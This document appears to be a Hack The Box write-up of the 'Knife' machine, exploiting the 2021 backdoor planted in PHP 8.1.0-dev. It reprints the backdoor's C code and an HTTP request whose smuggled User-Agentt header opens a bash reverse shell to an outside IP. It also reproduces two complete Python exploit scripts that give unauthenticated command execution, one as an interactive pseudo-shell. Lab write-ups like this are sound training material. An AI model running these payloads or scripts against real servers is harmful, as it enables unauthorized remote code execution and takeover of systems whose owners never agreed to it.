---
title: HTB Write Up - Knife
date: 2023-11-10 12:00:00
categories: [Pentest, HTB]
tags: [HTB]
---

## Step 1: Info gathering 
### Nmap

![](https://i.imgur.com/Jsb8j7r.png)

### Nikto
![](https://i.imgur.com/QpiosT3.png)

## Step 2: Vulnerablilty analysis 

### php 8.1.0-dev

>Two updates pushed to the PHP Git server added a line that, "if run by a PHP-powered website, would have allowed visitors with no authorization to execute code of their choice. The malicious commits here and here gave the code the code-injection capability to visitors who had the word “**zerodium**” in an HTTP header."
>
>The commits were made to the php-src repo under the account names of two well-known PHP developers, Rasmus Lerdorf and Nikita Popov. “We don't yet know how exactly this happened, but everything points toward a compromise of the git.php.net server (rather than a compromise of an individual git account),” Popov wrote in a notice published on Sunday night.
In the aftermath of the compromise, Popov said that PHP maintainers have concluded that their standalone Git infrastructure is an unnecessary security risk. As a result, they will discontinue the git.php.net server and make GitHub the official source for PHP repositories. Going forward, all PHP source code changes will be made directly to GitHub rather than to git.php.net.
>
>The malicious changes came to public attention no later than Sunday night by developers including Markus Staab, Jake Birchallf, and Michael Voříšek as they scrutinized a commit made on Saturday. The update, which purported to fix a typo, was made under an account that used Lerdorf’s name. Shortly after the first discovery, Voříšek spotted the second malicious commit, which was made under Popov’s account name. It purported to revert the previous typo fix.
>
>Zerodium is a broker that buys exploits from researchers and sells them to government agencies for use in investigations or other purposes. Why the commits referenced Zerodium is not clear. The company’s CEO, Chaouki Bekrar, said on Twitter Monday that Zerodium wasn’t involved.
{: .prompt-tip }

[Reference](https://arstechnica.com/gadgets/2021/03/hackers-backdoor-php-source-code-after-breaching-internal-git-server/)


```php
zval *enc;

	if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
		(enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
		convert_to_string(enc);
		if (strstr(Z_STRVAL_P(enc), "zerodium")) {
			zend_try {
				zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
			} zend_end_try();
		}
	}
```
![](https://i.imgur.com/yh1qDaj.png)

## Step 3: Exploit 

### Method 1: using Burpsuite 
```http
GET / HTTP/1.1
Host: 10.10.10.242
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
User-Agenttwho: zerodiumsystem("/bin/bash -c 'bash -i >&/dev/tcp/10.10.14.78/1444 0>&1'");
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

### Method 2: using Python
```python
# Exploit Title: PHP 8.1.0-dev (backdoor) | Remote Command Injection (Unauthenticated)
# Date: 23/05/2021
# Exploit Author: Richard Jones
# Vendor Homepage: https://www.php.net/
# Software Link: https://github.com/vulhub/vulhub/tree/master/php/8.1-backdoor
# Version: PHP 8.1.0-dev
# Tested on: Linux Ubuntu 20.04.2 LTS (5.4.0-72-generic)

# Based on the recent PHP/8.1.0-dev backdoor
# Infomation: https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a?branch=2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a&diff=unified#diff-a35f2ee9e1d2d3983a3270ee10ec70bf86349c53febdeabdf104f88cb2167961R368-R370
# Reference: https://news-web.php.net/php.internals/113838
# Vuln code in the link above (Original)
# When adding "zerodium" or  at the start of the user-agent field, will execute php code on the server
#  convert_to_string(enc);
#	if (strstr(Z_STRVAL_P(enc), "zerodium")) {
#		zend_try {
#			zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");


#Usage: python3 php_8.1.0-dev.py -u http://10.10.10.242/ -c ls

#!/usr/bin/env python3
import requests
import argparse

from requests.models import parse_header_links 

s = requests.Session()

def checkTarget(args):
    r = s.get(args.url)    
    for h in r.headers.items():
        if "PHP/8.1.0-dev" in h[1]:
            return True
    return False


def execCmd(args):
    r = s.get(args.url, headers={"User-Agentt":"zerodiumsystem(\""+args.cmd+"\");"})
    res = r.text.split("<!DOCTYPE html>")[0]
    if not res:
        print("[-] No Results")
    else:
        print("[+] Results:")
    print(res.strip())


def main():

    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="Target URL (Eg: http://10.10.10.10/)", required=True)
    parser.add_argument("-c", "--cmd", help="Command to execute (Eg: ls,id,whoami)", default="id")
    args = parser.parse_args()

    if checkTarget(args):
        execCmd(args)
    else:
        print("[!] Not Vulnerable or url error")
        exit(0)
    
if __name__ == "__main__":
    main()
```
or 
```python
# Exploit Title: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
# Date: 23 may 2021
# Exploit Author: flast101
# Vendor Homepage: https://www.php.net/
# Software Link: 
#     - https://hub.docker.com/r/phpdaily/php
#    - https://github.com/phpdaily/php
# Version: 8.1.0-dev
# Tested on: Ubuntu 20.04
# References:
#    - https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
#   - https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md

"""
Blog: https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
Download: https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py
Contact: flast101.sec@gmail.com

An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
The following exploit uses the backdoor to provide a pseudo shell ont the host.
"""

#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
            
```

## Step 4: Privilege escalation
Why not try Dirty_COW??

